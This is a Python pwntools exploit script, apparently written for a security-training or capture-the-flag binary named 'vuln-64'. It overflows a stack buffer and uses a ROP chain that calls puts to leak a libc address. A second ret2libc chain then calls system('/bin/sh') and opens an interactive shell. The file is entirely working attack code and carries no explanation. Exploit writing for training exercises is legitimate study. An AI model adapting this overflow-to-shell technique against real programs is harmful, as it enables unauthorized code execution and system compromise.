from pwn import *
from time import sleep

EX_NAME = './vuln-64'

elf = ELF(EX_NAME)
context.arch   = elf.arch
context.endian = elf.endian
context.os     = elf.os
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    # p = remote('leakers.training.offensivedefensive.it', 8080, ssl=True)
    print('NO REMOTE!')
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug(EX_NAME, api=True, gdbscript='''
        b main
        c
        ''')
    else:
        p = elf.process()

def dbg_stop():
    if 'GDB' in os.environ:
        input('Waiting...')

POP_RDI_RET = 0x00000000004011cb
POP_RSI_R15_RET = 0x00000000004011c9

sleep(0.5)
log.info(p.clean())

sleep(0.5)
input('W...')
p.sendline(flat(
    b'A'*0x28,
    POP_RDI_RET,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
))

sleep(0.5)
ln = p.recvline()[:-1]
log.info(f'raw: {ln} / {len(ln)}')
lk = u64(ln.ljust(8, b'\x00'))
# lk = u64(ln)
log.success(hex(lk))
log.info(p.clean())

libc = elf.libc
libc.address = lk - libc.sym['puts']

LC_POP_RDI_RET = 0x0000000000101dee

sleep(0.5)
input('W...')
p.sendline(flat(
    b'A'*0x28,
    POP_RDI_RET,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system'],
    elf.sym['main']
))

sleep(0.5)
p.interactive()
